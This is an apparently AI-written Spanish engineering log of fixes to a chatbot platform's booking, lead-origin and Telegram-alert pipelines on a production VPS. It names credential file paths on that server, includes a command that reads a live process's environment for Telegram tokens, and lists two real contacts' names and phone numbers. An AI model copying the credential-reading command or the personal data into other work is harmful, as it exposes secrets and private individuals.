      Y **avisar no alcanzó**: el simulador ya imprimía `⚠️ sin horarios … esta es OTRA rama del
      guion` en cada corrida, dos veces, y nadie cambió de rama.

      **Arreglo:** cuarto escalón — si el disco local no tiene el archivo, se le pregunta al VPS
      por SSH (nodo-casa lo tiene con `BatchMode`). Sólo sobre la ruta REAL de producción: pedirle
      al VPS un archivo de prueba no significa nada, y así los casos que inyectan rutas falsas
      siguen sin salir a la red. Cuando **ni el disco ni el VPS** contestan, cae al placeholder y
      lo dice nombrando **los dos** intentos — si el aviso sólo nombrara el archivo, se lee como
      «esta máquina no lo tiene» y manda a copiarlo a mano, que es el lugar equivocado.

      **Prueba:** 3 casos nuevos en `simulate.test.mjs`, el primero **rojo por el motivo exacto**
      (`expected 'sábado 5 de septiembre, 09:00'` / `actual 'HORARIO A (pendiente de definir)'`).
      Suite del bot **857/857** en 5,2 s (sin cambio de duración: nada sale a la red de verdad).
      Y la medición vuelve a ser la de producción: el simulador ahora sirve `M0` / `M0b` con
      *«A) martes 8 de septiembre, 14:00 · B) miércoles 9 de septiembre, 14:00»*.

      ⚠️ **Mi propio guardia era hueco y lo cazó la MUTACIÓN, no la lectura.** El caso *«una ruta
      que NO es la desplegada nunca sale a la red»* — el que protege la hermeticidad de toda la
      suite — hacía `spawnSync: () => assert.fail(...)`, y el lector remoto envuelve la llamada en
      un `try` con `catch` (para sobrevivir a un `ssh` ausente): **se comía la excepción del assert**, así
      que pasaba en verde incluso ensanchando el gate a propósito. Reescrito para **anotar** el
      testigo en vez de tirarlo; verificado en las dos direcciones (con `esLaDesplegada = true`
      da rojo, sin la mutación da verde). Un guardia que no puede fallar no es un guardia.

- [x] ✅ **CERRADO el 2026-09-06: al lead que escribió por el chat de la web le decíamos al dueño
      que había venido de WhatsApp.** Salió midiendo D1 en producción, no de una hipótesis: se
      disparó el webhook REAL de Chatwoot contra `app.onia.com.bo` (inbox 7 de la org QA, la única
      forma de ejercer el circuito entero) y el contacto quedó en la lista de Pacientes con
      `notes = "Entró por WhatsApp el 2026-09-06."` — habiendo entrado por el widget web.

      **Por qué importa más de lo que parece:** la procedencia se escribe **una sola vez, al crear**,
      y el módulo nunca la pisa (`notes` es campo clínico: ahí vive *"Alérgica a la penicilina"*).
      O sea que si miente, miente para siempre, y el dueño le contesta por WhatsApp a alguien que
      escribió por la web.

      **La causa, y la clase de bug:** `nombreDelCanal()` era una **segunda copia** de la decisión
      que ya vive en `canalDeInbox()` (`lib/chatbot/inboxes-de-la-org.ts`), con el orden invertido.
      Mientras dure el fallback de migración —`whatsapp = web` cuando la columna nueva está vacía,
      que es el estado de **todas** las orgs de producción hoy— el mismo inbox es los dos canales y
      **sólo el orden decide**. `canalDeInbox` le da el empate al web a propósito y está probado;
      la copia preguntaba por WhatsApp primero. Es la hermana de `isWhatsAppAddonActive`: el helper
      canónico existía y el que llamaba reimplementó la pregunta.

      **Arreglo:** `onia-platform` `b2c25d4` (rama `claude/chatbots-platform-review-0d1d09`).
      3 casos nuevos en `lib/chatbot/contacto-desde-chatwoot.test.ts`, el primero **rojo por el
      motivo exacto** (`expected 'Entró por WhatsApp el 2026-09-06.' to match /el chat de la web/i`)
      y los otros dos en la dirección inversa (con las dos columnas cargadas WhatsApp sigue siendo
      WhatsApp, y Meta no se confunde con la web). Gates: `tsc` 0 · **3178** tests · `eslint` 0
      errores. **NO DESPLEGADO** — llega al cliente con el swap de `plataforma` (`t_0268567b`).

      ⚠️ **Y el instrumento falló primero, en la dirección cara:** `mirar_bandeja_dueno.mjs --ancla`
      resuelve con `:text-is()`, que es match **exacto**, así que `--ancla "Tu asistente"` sobre el
      título `"Tu asistente, estos 7 días"` salió con *"El ancla NO está en /settings/chatbot"* —
      la misma cara que una tarjeta que no se renderiza. Casi se abre un bug sobre D4 estando vivo.
      Se descartó midiendo por otro lado (la función devolvió `{3,3,0}` contra la base de
      producción) y la captura salió con un ancla que **sí** es el texto completo de su nodo
      (`"pasaron a vos"`). Al usarlo: el ancla se elige del texto **entero** de un elemento.

- [x] ✅ **CERRADO el 2026-09-05: la promesa ya se cumple avisando.** El gate que este ítem
      construyó —`npm run demo:agendada`, el que mide el estado append-only y no el mensaje— sale
      **exit 0** medido hoy: *"SIN DEMOS HUECAS NUEVAS — desde que existe el aviso a Sergio, toda
      promesa tuvo su reserva o su aviso"*. La única promesa hueca que queda (conv 49) es de la
      sonda QA y es **anterior** al canal de aviso, así que se informa como historia y no como
      incidente. Lo que lo destrabó fue D2 (`t_b18ca430`): aviso por Telegram **sin** calendario,
      hoy encendido y con credenciales en el proceso vivo (ver el ítem de abajo). Cal.com sigue
      muerto y ya no bloquea nada. **La historia de cómo se llegó acá se conserva entera abajo:
      es el registro de tres modos de falla distintos, no relleno.**

      🔻 **Historia del ítem (cerrado, no rehacer):**
      **El bot cerraba la venta y la demo NO EXISTÍA: decía "Listo, agendado" sin reserva y sin
      avisarle a nadie.** Encontrado el 2026-09-03 recorriendo el frente (escalón 3), con los
      **tres** gates del carril en VERDE al mismo tiempo.
      **La medición, en producción y no en un test.** Se mandó el turno 3 por el widget real
      (conversación 49, mensajes 370-371):
      persona → *"Dale, reservame el viernes 4 a las 14:00"* ·
      bot → *"**Listo, agendado: viernes 4 de septiembre, 14:00**. … (Estoy confirmando ese
      horario con Sergio)"*. Y en la base del motor esa misma conversación quedó
      `bot_stage=demo_agendada · scheduled_at=2026-09-04 18:00Z · calendar_event_id=NULL`.
      **La demo no existe en ningún lado, y Sergio no sabe que existe.** El viernes a las 14:00
      no va nadie.
      **Las dos causas, verificadas contra el VPS y no leídas:** (1) `/opt/onia/bot/webhook.env`
      **no tiene `CALCOM_BASE_URL`**, así que `createBooking` sale por `reason:"sin_config"` antes
      de intentar nada — y Cal.com está muerto igual (cero contenedores, `cal.onia.com.bo` → 302 a
      `/empezar`); (2) `ONIA_N8N_ENABLED=false` y `ONIA_N8N_EVENT_URL` **vacío**, así que el
      efecto `notify_sergio` no llega a ningún lado, y es fire-and-forget a propósito.
      ⚠️ **Por qué ningún gate lo veía, que es lo que vale más que el bug: "contestó" no es
      "agendó".** La sonda dice *"EL BOT CONTESTO LOS 3"*, el vigía del colgado no dispara (el bot
      sí contestó) y `objetivo_visible` ve la conversación en la bandeja. Los tres miden que
      **salga un mensaje**, y el mensaje sale — entusiasta. Es el mismo modo de falla que este
      carril ya tiene escrito (*"un test que mira el primer paso no ve un sistema que muere en el
      segundo"*) corrido **un piso más arriba**: ahora muere en el turno que vale plata, con todos
      los anteriores en verde.
      **Lo que se hizo — hacer que se VEA, que es la regla 3 y lo único que no depende de Sergio:**
      `scripts/demo_agendada_real.mjs` (+ `npm run demo:agendada`, self-check cableado en `npm test`
      como `test:demo-agendada`). **No mide mensajes: mide el ESTADO que el motor escribió de sí
      mismo** — toda fila en `demo_agendada` tiene que tener `calendar_event_id`. Sólo lectura.
      **16/16** en seco y **exit 1 contra producción**, nombrando la conversación y el horario que
      le prometió. Un caso pinchado a propósito: con la tabla vacía sale 0 pero dice *"nada que
      festejar"* — cero demos no es un éxito, es que nadie llegó todavía al turno que vale.
      🔎 **Se descubrió corriéndolo, no leyéndolo:** la primera versión pedía `scheduled_label`,
      que no es columna (el texto lo arma el motor), y salió **2 — `column does not exist`**. Falló
      en rojo honesto en vez de dar un verde falso, que es para lo que existe el código 2.
      **Y una costura, no un cambio de guion:** `ONIA_SONDA_GUION` en `scripts/sonda_widget.mjs`
      permite medir un turno que el guion fijo no cubre (mismo patrón que `ONIA_RESCATE_CANDIDATOS`).
      **El default NO cambia** y hay tres casos que lo pinchan: sin la variable, la sonda horaria
      manda exactamente los dos mensajes del prompt. **33 → 36 casos**, verde.
      🔴 **FALTA PARA CERRARLO, y NO lo puede hacer este carril:** que la reserva funcione de
      verdad. Son dos decisiones de Sergio que ya existen y hoy se cotizan solas —
      **S12/S13** (el aviso: Telegram directo reusando el `TG_BOT_TOKEN` que el watchdog ya usa,
      vs. crear el workflow de n8n) y **revivir Cal.com o dejar de prometer lo que no se reserva**.
      Mientras tanto el gate está en **rojo y a la vista**, que es lo que faltaba: hasta hoy una
      demo prometida e inexistente no disparaba absolutamente nada.
      **Reproducción en 30 s:** `npm run demo:agendada` → exit 1.
      🔴 **AMPLIADO el 2026-09-03 (vuelta siguiente): ese gate "en rojo y a la vista" llevaba una
      hora en VERDE, y lo apagaba el propio chequeo de arranque de este carril.** Lo encontró el
      chequeo de arranque, no la cola: la sonda salió *"EL BOT CONTESTO LOS 2"* y, acto seguido,
      `npm run demo:agendada` salió **exit 0 — "SIN DEMOS AGENDADAS"**. La promesa de arriba no se
      había cumplido: había desaparecido.
      **Los tres relojes, medidos sobre la misma conversación 49:**
      `15:09Z` la promesa (msg 371) deja la fila en `demo_agendada · calendar_event_id=NULL` →
      gate **exit 1**, correcto · `16:04Z` corre `sonda_widget.mjs` (msgs 372-375) y la fila queda
      `esperando_horario · scheduled_at=NULL · calendar_event_id=NULL` · `16:05Z` gate **exit 0**.
      **La causa, y está escrita a propósito en el código:** `guionBlanqueo()` de
      `scripts/sonda_widget.mjs:294` hace `bot_stage='nuevo', scheduled_at=null,
      calendar_event_id=null` sobre la conversación que la sonda reusa — que es **la misma** que el
      gate lee. La sonda tiene razón en blanquear (sin eso el motor arranca con el embudo lleno y
      deriva en el primer turno, ya está medido arriba). El error era del gate: sacaba su lista de
      sujetos de `where bot_stage='demo_agendada'`, un estado **mutable**, así que su única fila
      roja se borraba sola cada hora. **Un gate cuya evidencia puede desaparecer no es un gate: es
      un permiso.** Es el modo de falla que el carril ya tiene escrito para el gate de compartir
      de `web-venta` (*"sacar la LISTA DE SUJETOS de una lista de inclusión falla ABIERTO"*), con la vuelta de
      tuerca de que acá **el que vaciaba la lista era el instrumento del propio carril**.
      **Lo que se hizo:** `scripts/demo_agendada_real.mjs` ya no mide el estado del motor, mide el
      lado **append-only**: los mensajes salientes de Chatwoot que contienen la promesa. Chatwoot no
      reescribe `messages`, así que una promesa dicha no se desdice borrando una fila — y una fila
      blanqueada ahora **destapa** el hueco en vez de taparlo. La frase se saca de `M2` del guion del
      propio bot (`hermes-content/deploy/vps-ops/bot/config.mjs:147`) y **no se hardcodea**: pegada acá, el día que alguien reescriba
      M2 el gate quedaría verde para siempre buscando un texto que ya nadie manda — el mismo bug un
      piso más abajo. Sin M2 legible sale **2**, que es *"no medir NO es estar bien"*.
      **Rojo primero, por el motivo correcto:** `ReferenceError: frasePromesa is not defined`.
      **16 → 26 casos**, verde, con un guardia contra el guion REAL en disco (los casos con texto
      inyectado pasarían igual con `config.mjs` ausente).
      ✅ **Verificado contra producción, no contra el test, y con la prueba más limpia que había:
      misma base, mismo instante, veredicto opuesto.** Sobre el estado que la sonda dejó a las
      16:04 —el que ponía el gate viejo en verde— el nuevo sale **exit 1**: *"1 de 1 DEMO(S)
      PROMETIDAS QUE NO EXISTEN: conv 49 (\"Listo, agendado: viernes 4 de septiembre, 14:00\")"*.
      **Mañana** a las 14:00 nadie va a esa demo, y ahora eso vuelve a estar dicho en voz alta.
      🔎 **Lo que este ítem NO arregla, a propósito:** la reserva sigue sin funcionar (Cal.com
      muerto, `CALCOM_BASE_URL` ausente, `notify_sergio` a ningún lado). Eso son **S12/S13** y
      decide Sergio (ya preguntado: tablero `t_b18ca430`, bloqueado — **no volver a preguntarlo**).
      Lo que se recuperó es la capacidad de VERLO — que es lo único que no dependía
      de él, y que llevaba una hora perdida sin que nadie lo notara.
      ⚠️ **Y para que nadie se asuste leyendo el rojo: hoy la conv 49 es `Sonda QA carril chatbot`,
      no una persona.** Verificado, no supuesto (join `conversations→contact_inboxes→contacts`).
      O sea que mañana a las 14:00 **no** hay un humano esperando: el motor hizo lo incorrecto, pero
      no hay nadie colgado. Por eso esta vuelta **no mandó alarma a Sergio** — un aviso de "alguien
      va a una reunión vacía" que no tiene a nadie del otro lado es exactamente cómo se dejó de
      creerle al vigía del embudo.
      ✅ **HECHO el 2026-09-03 (vuelta siguiente): el gate ya dice QUIÉN está del otro lado.** Era
      el próximo paso anotado acá, y hacía falta porque la frase de cierre era **falsa**: salía
      siempre *"Del otro lado hay alguien que va a llegar a una reunión vacía"*, y la única promesa
      hueca era `Sonda QA carril chatbot`, el instrumento de este mismo carril. Nadie iba a ninguna
      reunión. **Un vigía que grita mal no molesta: INUTILIZA** — es exactamente como se dejó de
      creerle al vigía del embudo, y este gate iba camino a lo mismo en su segundo día de vida.
      **Se informa, NO se filtra, y el código de salida lo prueba: 1 en los dos casos.** Excluir a
      la sonda de los sujetos devolvería el gate a fallar abierto, que es el bug de la vuelta
      anterior. Lo único que cambia es la frase — que es lo que decide si Sergio deja todo y actúa.
      **Los dos veredictos, medidos con identidades REALES de la base y no con fixtures:**
      · hoy → `1 de 1 … conv 49 «Sonda QA carril chatbot» … Hoy son TODAS de la sonda QA de este
      carril, así que no hay nadie plantado — pero el motor prometió exactamente lo mismo que le
      prometería a un lead, y por eso sigue en rojo.`
      · con los dos desconocidos de verdad de la bandeja (`F` +59173232758 y `mariohassen`
      +59173021804, tal como salen del join a `contacts`) → `2 de 2 … conv 35 «F» · conv 37
      «mariohassen» … Del otro lado hay alguien que va a llegar a una reunión vacía.`
      **El predicado de "quiénes somos nosotros" se IMPORTA de `scripts/objetivo_visible.mjs`, no se
      copia** (`esNuestra`, con el celular de Sergio y los nombres de QA): dos listas del mismo
      tema divergen el día que alguien agrega un número a una sola, y `CLAUDE.md` pide una fuente
      por tema.
      ⚠️ **El sesgo va al REVÉS que en el otro gate, a propósito.** En `scripts/objetivo_visible.mjs` "parece
      nuestro" pone el gate más rojo; acá bajaría el volumen. Por eso **un contacto que no se pudo
      leer se trata como persona real** y grita: equivocarse gritando se investiga en un minuto,
      equivocarse callando deja a alguien plantado.
      **Rojo primero, por el motivo correcto:** los 7 casos nuevos fallaron por lo que tenían que
      fallar (`nombra al contacto de la promesa hueca`, `no inventa un humano esperando cuando es
      la sonda`, …). **38 → 44 casos**, verde, y `npm test` entero en verde.
      🔎 **Y un defecto encontrado al EJECUTARLO, no al leerlo: `demo_agendada_real.mjs` no tenía
      la guarda de `argv[1]`.** Importar el módulo para probar `juzgar` con datos reales disparaba
      **dos `docker exec` contra producción y un `process.exit()`** como efecto de cargarlo: el
      proceso que importaba se moría antes de su primera línea. `scripts/objetivo_visible.mjs` ya tenía la
      guarda y este archivo la había copiado sin ella. Arreglado y **pinchado con un caso que corre
      en un proceso hijo** (en este el módulo ya está cacheado y el test pasaría en falso).
      **Reproducción en 30 s:** `npm run demo:agendada` → exit 1 nombrando al contacto.
      ✅ **CAMBIÓ el 2026-09-04: el gate mide `exit 0`, y no porque se lo aflojara.** La
      reproducción de arriba ya NO da 1 — dice *"SIN DEMOS HUECAS NUEVAS: desde que existe el aviso
      a Sergio, toda promesa tuvo su reserva o su aviso"*, y trata la conv 49 como historia anterior
      al canal, que es lo que evita que un vigía grite por algo que ya no se puede rescatar.
      **Lo que lo destrabó es la decisión D2 (`t_b18ca430`), que ya se tomó:** aviso por Telegram
      **sin** calendario. Medido en el proceso vivo, no leído: `ONIA_BOT_TG_AVISO=true` en el
      entorno del webhook (`/proc/<pid>/environ`) y una línea real de hoy —
      `[aviso] sent conv=57 (pidio_humano_recepcion): aviso enviado`. El envío mira
      `respuesta.ok` **y** `cuerpo.ok === false`, así que "sent" es acuse de Telegram, no
      fire-and-forget. **Cal.com sigue muerto y eso ya no bloquea nada**: la promesa se cumple
      avisando, no reservando.

- [x] ✅ **CERRADO el 2026-09-05: el aviso está DESPLEGADO y ENCENDIDO en producción.** El ítem
      se quedó abierto por su última línea (*"NO DESPLEGADO — el archivo nuevo falta en el VPS y
      `webhook-server.mjs` difiere"*), y eso **venció**. Medido hoy contra el VPS, no leído:
      · `/opt/onia/bot/aviso-telegram.mjs` existe (9.628 B, 04-sep 14:34)
      · `webhook-server.mjs` repo vs producción → **idéntico** (`diff -q`)
      · el lanzador pasa las variables del aviso (`grep -c ONIA_BOT_TG_AVISO webhook-server.sh` → 5)
      · y en el **proceso vivo** (PID 25138): `ONIA_BOT_TG_AVISO=true` con `TG_BOT_TOKEN` y
        `TG_CHAT_ID` presentes — que es el único lugar donde este flag dice la verdad.
      `npm run avisos:vivo` da **circuito ok** en sus cuatro eslabones (flag, credenciales, el
      motor emitiendo `notify_sergio`, texto accionable) con **0 eventos**, que es verde: no hubo
      handoffs, no es que no salgan. Lo que queda en el espejo sin desplegar son **instrumentos**
      de medición nuevos (`avisos-vivo.mjs`, `rubros-vivos.mjs`, `anticipacion-viva.mjs` y sus
      tests), no el motor — no atienden a nadie y su lugar es el repo.

      🔻 **Historia del ítem (cerrado, no rehacer):**
      **El bot prometía "ya le pasé tu consulta a Sergio, te escribe él" y NADIE se lo pasaba:
      el aviso del handoff viajaba hasta un canal apagado.** Encontrado el 2026-09-03 18:10 UTC
      cerrando el ítem de abajo, mirando el frente *"lo que promete"* — no por la cola.
      **La medición, en producción:** conversación 49, mensaje 389 (recién derivada por el arreglo
      de abajo). Texto literal del bot: *"Eso lo tiene que ver Sergio, no yo… **Ya le pasé tu
      consulta con todo lo que me contaste. Te escribe él desde este mismo número**, en horario de
      oficina"*. Nadie recibió nada.
      **La cadena entera, seguida archivo por archivo hasta el final — y el final no existe:**
      `hermes-content/deploy/vps-ops/bot/bot-engine.mjs:319` emite el efecto `notify_sergio` ·
      `hermes-content/deploy/vps-ops/bot/chatwoot-adapter.mjs:756-762` lo propaga hacia arriba (con
      un comentario que dice, textual, que antes *"ESTE archivo lo tiraba"*) ·
      `hermes-content/deploy/vps-ops/bot/n8n-event.mjs:161-165` lo mete en el evento del turno como
      `notifyCount` / `notifyReasons`, marcados ahí mismo como *"lo único de este evento que NO es
      analítica"* ·
      y ese evento sale por n8n, que en `/opt/onia/bot/webhook.env` está **`ONIA_N8N_ENABLED=false`
      con `ONIA_N8N_EVENT_URL` vacío** (medido hoy, no leído de un doc). Cuatro archivos que se
      pasan la posta con cuidado hacia una puerta tapiada.
      ⚠️ **No está perdido, está mudo — y la diferencia importa para elegir el arreglo.** El lead
      SÍ queda en `onia_center.review_queue`
      (`hermes-content/deploy/vps-ops/bot/persistence.mjs:731`) y la conversación se ve en
      `/inbox`. O sea que el dato existe: lo que falta es que algo golpee la puerta. Por eso esto
      **no es** "se pierde el lead", es "Sergio se entera sólo si abre el panel" — que es
      exactamente lo que el comentario del adapter dice que quería evitar.
      ✅ **El vigía del colgado ya NO lo tapa — arreglado el 2026-09-03, ítem de abajo.** Decía
      acá que `scripts/vigia_sin_respuesta.mjs:93` descarta toda conversación cuyo último mensaje
      sea saliente (`// ya le contestaron`), y que en un handoff ese último mensaje es el del bot,
      así que **mientras el prospecto no insista, nada lo ve**. Eso era cierto hasta hoy: ahora
      `seleccionarEsperandoHumano()` mira ese caso aparte. **Lo que sigue faltando es el aviso en
      el momento**, que es la decisión de Sergio de acá abajo — la red nueva avisa a los 30 min,
      no al instante.
      📈 **Y esto se volvió MÁS frecuente hoy, por el arreglo de abajo.** Hasta las 18:04 una
      pregunta de producto se la tragaba el off-guion; ahora va a handoff, que es lo correcto —
      pero suma un motivo más a un aviso que no sale. Los motivos que ya caían acá:
      `soporte_cliente`, `consulta_clinica_o_legal`, `queja_o_desconfianza`,
      `pidio_hablar_con_humano`, `ningun_horario_le_sirve`.
      🔴 **DEPENDE DE SERGIO — y es la MISMA decisión que ya está preguntada, no una nueva:**
      tablero `t_b18ca430`, opciones (a) Telegram directo reusando el `TG_BOT_TOKEN` que el
      watchdog ya usa · (b) n8n · (c) las dos. **No volver a preguntarlo.** Lo único que cambió es
      el tamaño: esa tarea está redactada como "la demo agendada", y el canal muerto se lleva
      puesto **todo handoff**, que es bastante más que las demos. Anotado como comentario en esa
      tarea el 2026-09-03, para que la decisión se tome sabiendo el alcance real.
      **Reproducción en 30 s:** `grep -E '^ONIA_N8N_(ENABLED|EVENT_URL)' /opt/onia/bot/webhook.env`
      → `false` y vacío. Ése es el corte, y conviene decir dónde NO está para que nadie lo busque
      dos veces: `hermes-content/deploy/vps-ops/bot/webhook-server.mjs` no nombra `notify` ni una
      vez (`grep -c` → 0) y **eso no es el bug** — le pasa el `result` entero a
      `buildBotTurnEvent` (línea 450), así que el aviso sube bien. Muere en el envío, no en el
      armado.
      ✅ **CONSTRUIDO HASTA EL BORDE el 2026-09-03 20:20 UTC — falta el deploy, no la decisión.**
      La opción (a) del tablero está escrita, probada y apagada: `hermes-content/deploy/vps-ops/bot/aviso-telegram.mjs` +
      su test (18 casos), cableado en `hermes-content/deploy/vps-ops/bot/webhook-server.mjs`. Encenderla es
      `ONIA_BOT_TG_AVISO=true`; si Sergio elige (b) n8n, el flag se queda en `false` y no cambia
      nada. **No se decidió por él: se le sacó el trabajo de encima para que su respuesta sea un
      "sí" y no un proyecto.**
      ⚠️ **"Encenderla es `ONIA_BOT_TG_AVISO=true`" era FALSO — corregido el 2026-09-04 (`28863e0e3`).**
      No estaba construido hasta el borde: faltaba el último centímetro, y era invisible. El
      lanzador **no arranca el bot con el entorno del shell**: lo arranca con `docker exec -d` y
      una **lista blanca** de `-e VAR=...` (`hermes-content/deploy/vps-ops/bot/webhook-server.sh`), y **ninguna de las cinco
      variables del aviso estaba en esa lista**. O sea: copiar el token a `/opt/onia/bot/webhook.env` y poner el
      flag en `true` **no habría encendido nada, y sin fallar** — el log habría seguido diciendo
      `apagado (ONIA_BOT_TG_AVISO)` y el que lo intentaba habría concluido que el código está roto.
      Medido en el proceso VIVO, no en el `.env`:
      `docker exec onia-center sh -c "tr '\0' '\n' < /proc/6741/environ" | grep TG_` → **vacío**.
      Mientras tanto, en producción: `[aviso] skipped (...)` sobre handoffs **reales** (conversaciones
      53 y 55, 2026-09-04). Arreglado: el lanzador pasa las tres, y saca token y chat de
      `/root/.config/onia/backup.env` — de donde ya los lee `webhook-watchdog.sh` cada 2 min—, así
      que **no hay credencial nueva ni nada que copiar a mano**. Probado de punta a punta con el
      módulo y el token reales: `enviarAvisoTelegram` → `{ok:true,status:"sent"}`, el mensaje llegó.
      Gate nuevo `hermes-content/deploy/vps-ops/bot/lanzador-pasa-env.test.mjs`: saca los sujetos de
      `webhook.env.example` (no de una lista a mano, que **falla abierto**), así una variable
      documentada nace cubierta. Rojo antes por los 3 nombres, verde ahora; 818/818 en `node --test`.
      **Sigue COMMITEADO y NO DESPLEGADO** — `/opt/onia/bot` corre el lanzador viejo. Deploy pedido
      en el tablero `t_59b4761d` con el diff ya verificado en las dos direcciones (cero líneas
      exclusivas de producción: copiar no borra nada).
      ⚠️ **"Después del deploy, encenderlo es una sola línea" también era una trampa — corregido el
      2026-09-04 (`ba478c34b`).** Esa línea había que escribirla en `/opt/onia/bot/webhook.env`, que
      **no está en git y que ningún deploy toca** (medido: `grep -c ONIA_BOT_TG_AVISO
      /opt/onia/bot/webhook.env` → **0**). Con el flag en `false` por defecto, desplegar el lanzador
      arreglado **no encendía nada**: el bot arrancaba, el log seguía diciendo `apagado`, y nada se
      ponía rojo. Es el mismo bug una capa más arriba — dos veces seguidas el "último centímetro"
      resultó ser el que nadie mira. Sergio ya había decidido que sí (`t_b18ca430`, opción (c)), así
      que **una decisión tomada no puede depender de que alguien recuerde editar a mano un archivo
      fuera de git**: ahora el aviso **viene encendido de fábrica** y el token sale solo de
      `/root/.config/onia/backup.env`. Apagarlo es la línea en `/opt/onia/bot/webhook.env`, que gana
      por el `:-`. De paso se tapó el
      bug que el cambio de default metía: la guarda de credenciales miraba `${ONIA_BOT_TG_AVISO:-}`
      (vacío) mientras el `docker exec` recibía `true`, así que con el operador sin configurar nada
      —el caso normal— el aviso quedaba encendido y la advertencia **muda**; las dos leen ahora el
      mismo `TG_AVISO`. Y `hermes-content/deploy/vps-ops/bot/webhook.env.example` decía `=false`, así
      que regenerar el env volvía a apagarlo en silencio. Verificado en los tres casos (sin nada
      configurado advierte; apagado a mano no advierte; con el archivo real de tokens toma token y
      chat sin advertir, que es el caso de producción) y 834/834 en `node --test`.
      🔎 **La justificación del canal muerto era FALSA, y por eso esto se pudo escribir sin
      pedir nada.** `hermes-content/deploy/vps-ops/bot/chatwoot-adapter.mjs:761` dice que el aviso va por n8n *"porque ahí vive la
      credencial de Telegram (el plan VPS no soporta `$env` en los nodos, así que el token no
      puede vivir acá)"*. Lo de n8n es cierto; **la conclusión no**: el límite es de los NODOS de
      n8n, no del bot. El bot es un proceso de Node en el mismo VPS y el token ya está en dos
      archivos que otros procesos leen hace meses — `/root/.hermes/.env` (`TELEGRAM_BOT_TOKEN`,
      lo usa `/root/bin/onia-tg.sh`) y `/root/.config/onia/backup.env` (`TG_BOT_TOKEN`/`TG_CHAT_ID`, lo usa
      `/opt/onia/bot/webhook-watchdog.sh` **cada 2 minutos por cron**). No faltaba ninguna credencial: faltaba
      el código. Un comentario que explica por qué algo no se puede hacer es una hipótesis, y
      esta llevaba semanas sin que nadie la midiera.
      **Dos cosas distintas ya no comparten interruptor**, que es el bug de fondo y sobrevive a
      cualquiera de las tres opciones: el aviso viajaba como un campo (`notifyCount`) DENTRO del
      evento de n8n, así que apagar la analítica apagaba también lo único de ese evento que no es
      analítica. Ahora sale por su propio camino y deja línea en el log **salga o no** — el modo
      de falla de este carril es justamente el aviso que no sale y nadie lo nota.
      **Rojo primero, por el motivo correcto** (pinchando el módulo a propósito y restaurándolo):
      sin el escape de HTML el `<script>` de un prospecto sale crudo, y sin mirar el `ok:false`
      un 200 de Telegram que descartó el mensaje se lee como enviado — los dos falsos verdes que
      harían que el aviso muera igual que ahora, pero con mejor cara. **772 casos verdes** en
      `node --test` (754 → 772).
      ✅ **DESPLEGADO — verificado el 2026-09-10 22:46 La Paz.** Las dos afirmaciones del texto
      anterior (*"el archivo nuevo falta en el VPS"* y *"`webhook-server.mjs` difiere"*) son las
      dos falsas hoy: `ls -l /opt/onia/bot/aviso-telegram.mjs` → existe (10.055 B, 7-sep), y el
      `md5sum` de `/opt/onia/bot/webhook-server.mjs` y el del repo dan la MISMA suma, byte a byte
      (se reproduce corriendo los dos `md5sum` y comparando). Lo único que `espejo-check.mjs`
      marca ausente hoy es
      `urgencia-en-el-handoff.test.mjs`, que es un test: no viaja al runtime ni lo ve un cliente.
      Sigue pendiente la decisión de Sergio Urcullo (`t_b18ca430`), que es sólo encender un flag.

- [x] 🔴 **El que ESPERA a un humano prometido era invisible para todo el sistema: el único vigía
      que mira la bandeja lo descartaba con un `// ya le contestaron` que en un handoff es
      mentira.** Encontrado el 2026-09-03 19:00 UTC recorriendo el frente del ítem de arriba, con
      `npm test` entero en verde y el vigía corriendo cada 2 h **sin poder ver este caso**.
      **La medición, en producción y no en un test:** el bot deriva y le dice a la persona
      *"Ya le pasé tu consulta con todo lo que me contaste. Te escribe él desde este mismo
      número"*. Ese es el último mensaje de la conversación, y es **saliente**. El vigía
      (`scripts/vigia_sin_respuesta.mjs`) descarta toda conversación cuyo último mensaje sea
      saliente, así que la persona que hizo bien en esperar desaparecía de la única red que mira
      la bandeja. Sólo reaparecía si **volvía a insistir** — o sea que el vigía veía al impaciente
      y perdía al que confió. Y el que confía es el que se va sin decir nada.
      ⚠️ **Por qué ningún gate lo veía, y no es el mismo motivo que arriba:** el gate
      `demo:agendada` mira las promesas de reserva (M2) y el vigía mira a los que nadie contestó.
      El handoff (M5) caía **entre los dos**: para el gate no es una demo, y para el vigía "ya le
      contestaron" porque técnicamente salió un mensaje. Dos redes correctas con un agujero justo
      en el medio, que es donde el bot manda a todo lead con una pregunta que no sabe responder —
      y hoy son seis motivos, uno más desde el arreglo de las 18:04.
      **Lo que se hizo:** `seleccionarEsperandoHumano()` en el mismo archivo (no un script nuevo:
      dos definiciones de "nadie lo atendió" en el mismo carril envejecen en direcciones
      distintas). Mira el lado **append-only** —los mensajes de Chatwoot, que no se reescriben— y
      no el `bot_stage` del motor, que la sonda del propio carril blanquea cada hora: es la
      lección que este carril ya pagó con `scripts/demo_agendada_real.mjs`.
      **Cómo decide que el humano no llegó, sin hardcodear a nadie:** el bot es **el sender de la
      propia promesa**, y cualquier saliente posterior de OTRO sender es una persona y cierra el
      caso. Derivarlo del mensaje —en vez de escribir `sender_id = 3` acá— mantiene el criterio
      cierto el día que el bot cambie de token. Que el bot siga hablando (el `M5_ACUSE`) **no**
      cuenta como que llegó el humano: si tapara el aviso, el acuse de recibo sería el mejor
      escondite del embudo. Y un entrante posterior lo saca de esta lista a propósito — ese caso
      ya es del vigía de arriba, y dos avisos por la misma conversación es como se le deja de
      creer a un vigía.
      **La frase se saca de `M5` del guion del propio bot**
      (`hermes-content/deploy/vps-ops/bot/config.mjs:233-237`) y **no se
      hardcodea**: pegada acá, el día que alguien reescriba M5 el vigía quedaría ciego en silencio
      buscando un texto que ya nadie manda. De las tres líneas de M5 se queda con la **más larga**
      —la primera, *"Eso lo tiene que ver…"*, es corta y marcaría cualquier cosa— y hay un guardia
      contra el guion REAL en disco, porque los otros casos usan texto inyectado y pasarían igual
      con `config.mjs` ausente.
      **Y el aviso separa los dos grupos**, no los suma: al que nadie contestó hay que
      contestarle, y al que espera un humano el bot **ya le prometió** que le escriben. Bajo el
      título viejo (*"escribieron y nadie contesto"*) el segundo grupo sería falso, y un vigía que
      grita mal no molesta: inutiliza. El aviso muestra **lo último que dijo la persona**, no el
      texto del bot: Sergio necesita saber a qué contestar, y su propia promesa no se lo dice.
      **Rojo primero, por el motivo correcto:** `SyntaxError: does not provide an export named
      'CONFIG_DEL_BOT'`. **15 → 28 casos**, verde, y `npm test` entero en verde (exit 0).
      ✅ **Verificado contra PRODUCCIÓN, no contra el test, y con los dos controles que importan.**
      Sobre las 191 filas reales de Chatwoot: la frase sacada del guion aparece **en 5 mensajes
